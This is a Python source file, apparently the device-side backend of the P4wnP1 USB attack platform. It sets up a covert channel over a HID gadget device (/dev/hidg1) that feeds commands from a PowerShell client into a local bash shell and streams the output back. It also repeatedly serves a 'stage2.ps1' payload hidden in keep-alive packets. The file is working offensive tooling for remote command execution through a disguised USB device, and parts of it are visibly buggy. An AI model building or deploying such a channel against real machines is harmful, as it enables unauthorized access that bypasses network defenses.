#!/usr/bin/python
# Works with SendHID6.ps1
import sys
import struct
import Queue
import subprocess
import thread
import signal
from select import select
import time

chunks = lambda A, chunksize=60: [A[i:i+chunksize] for i in range(0, len(A), chunksize)]

# single packet for a data stream to send
# 0:	1 Byte 		src
# 1:	1 Byte 		dst
# 2:	1 Byte 		snd
# 3:	1 Byte 		rcv
# 4-63	60 Bytes	Payload


def fragment_rcvd(qin, fragemnt_assembler, src=0, dst=0, data=""):
	stream_id = (src, dst)
	# if src == dst == 0, ignore (heartbeat)
	if (src != 0 or dst !=0):
		# check if stream already present
		if fragment_assembler.has_key(stream_id):
			# check if closing fragment (snd length = 0)
			if (len(data) == 0):
				# end of stream - add to input queue
				stream = [src, dst, fragment_assembler[stream_id][2]]
				qin.put(stream)
				# delete from fragment_assembler
				del fragment_assembler[stream_id]
			else:
				# append data to stream
				fragment_assembler[stream_id][2] += data
				#print repr(fragment_assembler[stream_id][2])
		else:
			# start stream, if not existing
			data_arr = [src, dst, data]
			fragment_assembler[stream_id] = data_arr


def send_datastream(qout, src=1, dst=1, data=""):
	# split data into chunks fitting into packet payload (60 bytes)
	chnks = chunks(data)
	for chunk in chnks:
		data_arr = [src, dst, chunk]
		qout.put(data_arr)
	# append empty packet to close stream
	qout.put([src, dst, ""])


def send_packet(f, src=1, dst=1, data="", rcv=0):
	snd = len(data)
	#print "Send size: " + str(snd)
	packet = struct.pack('!BBBB60s', src, dst, snd, rcv, data)
	#print packet.encode("hex")
	f.write(packet)
		
def read_packet(f):
	hidin = f.read(0x40)
        #print "Input received (" + str(len(hidin)) + " bytes):"
        #print hidin.encode("hex")
	data = struct.unpack('!BBBB60s', hidin)
	src = data[0]
	dst = data[1]
	snd = data[2]
	rcv = data[3]
	# reduce msg to real size
	msg = data[4][0:snd]
	return [src, dst, snd, rcv, msg]

def process_input(qin, subproc):
	# HID in loop, should ho to thread
	# check if input queue contains data
	while True:
		if not qin.empty():
			input = qin.get()
			src=input[0]
			dst=input[1]
			stream=input[2]
		
			# process received input
			# stdin (redirect to bash)
			if dst == 1:
				command=stream
				if command.upper() == "RESET_BASH":
					# send sigint to bash
					print "Restarting bash process"
					reset_bash(subproc)
				else:
					print "running command '" + command + "'"
					run_local_command(command, subproc)
			# stderr
			elif dst == 2:
				pass
			# stderr
			elif dst == 3:
				pass
				# getfile
				print "getfile received: " + stream
				args=stream.split(" ",3)
				if (len(args) < 3):
					# too few arguments, echo this back with src=2, dst=3 (stderr)
					print "To few arguments"
					send_datastream(qout, 2, 3, "P4wnP1 received 'getfile' with too few arguments")
			else:
				print "Input in input queue:"
				print input
	



def run_local_command(command, bash):
	bash = subproc[0]
	sin = bash.stdin
	sin.write(command + "\n")
	sin.flush()
	return

def process_bash_output(qout, subproc):
	buf = ""
	while True:
		bash = subproc[0]
		outstream = bash.stdout
		
		#print "Reading stdout of bash on " + str(outstream)

		# check for output which needs to be delivered from backing bash
		try:
			r,w,ex = select([outstream], [], [], 0.1)
		except ValueError:
			# we should land here if the output stream is closed
			# because a new bash process was started
			pass

		if outstream in r:
			byte = outstream.read(1)

			if byte == "\n":
				# full line received from subprocess, send it to HID
				#   note: the newline char isn't send, as each outputstream is printed in a separate line by the powershell client
		
				# we set src=1 as we receive bash commands on dst=1
				# dst = 2 (stdout of client)
				send_datastream(qout, 2, 2, buf)
				# clear buffer
				buf = ""
			else:
				buf += byte

def process_bash_error(qout, subproc):
	buf = ""
	while True:
		bash = subproc[0]
		errstream = bash.stderr

		# check for output which needs to be delivered from backing bash stderr
		try:
			r,w,ex = select([errstream], [], [], 0.1)
		except ValueError:
			# we should land here if the error stream is closed
			# because a new bash process was started
			pass
		
		if errstream in r:
			byte = errstream.read(1)
			if byte == "\n":
				# full line received from subprocess, send it to HID
				#   note: the newline char isn't send, as each outputstream is printed in a separate line by the powershell client
			
				# dst = 3 (stderr of client)
				send_datastream(qout, 3, 3, buf)
				# clear buffer
				buf = ""
			else:
				buf += byte

# As we don't pipe CTRL+C intterupt from client through
# HID data stream, there has to be another option to reset the bash process if it stalls
# This could easily happen, as we don't support interactive commands, waiting for input
# (this non-interactive shell restriction should be a known hurdle to every pentester out there) 
def reset_bash(subproc):
	bash = subproc[0]
	bash.stdout.close()
	bash.kill()
	send_datastream(qout, 3, 3, "Bash process terminated")
	bash = subprocess.Popen(["bash"], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
	subproc[0] = bash
	if bash.poll() == None:
		send_datastream(qout, 3, 3, "New bash process started")
	else:
		send_datastream(qout, 3, 3, "Restarting bash failed")

	

# main code
qout = Queue.Queue()
qin = Queue.Queue()
fragment_assembler = {}
bash = subprocess.Popen(["bash"], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
subproc = [bash] # packed into array to allow easy "call by ref"

# process input
thread.start_new_thread(process_input, (qin, subproc))
# process output
thread.start_new_thread(process_bash_output, (qout, subproc))
# process error
thread.start_new_thread(process_bash_error, (qout, subproc))

# Initialize stage one payload, carried with heartbeat package in endless loop
with open("stage2.ps1","rb") as f:
	stage2=f.read()
#initial_payload="#Hey this is the test data for an initial payload calling get-date on PS\nGet-Date"
stage2_chunks = chunks(stage2)
heartbeat_content = []
heartbeat_content += ["begin_heartbeat"]
heartbeat_content += stage2_chunks
heartbeat_content += ["end_heartbeat"]
heartbeat_counter = 0

with open("/dev/hidg1","r+b") as f:
	# send test data stream
	send_datastream(qout, 1, 1, "Hello from P4wnP1, this message has been sent through a HID device")

	while True:
		packet = read_packet(f)
		src = packet[0]
		dst = packet[1]
		snd = packet[2]
		rcv = packet[3]
		msg = packet[4]

		# put packet to input queue
		fragment_rcvd(qin, fragment_assembler, src, dst, msg)
		
		#print "Packet received"
		#print "SRC: " + str(src) + " DST: " + str(dst) + " SND: " + str(snd) + " RCV: " + str(rcv)
		#print "Payload: " + repr(msg)
				
		
		# send data from output queue (empty packet otherwise)
		if qout.empty():
			# empty keep alive (rcv field filled)
			#send_packet(f=f, src=0, dst=0, data="", rcv=snd)
			
			# as the content "keep alive" packets (src=0, dst=0) is ignored
			# by the PowerShell client, we use them to carry the initial payload
			# in an endless loop
			if heartbeat_counter == len(heartbeat_content):
				heartbeat_counter = 0
			send_packet(f=f, src=0, dst=0, data=heartbeat_content[heartbeat_counter], rcv=snd)
			heartbeat_counter += 1
			
		else:
			packet = qout.get()
			send_packet(f=f, src=packet[0], dst=packet[1], data=packet[2], rcv=snd)

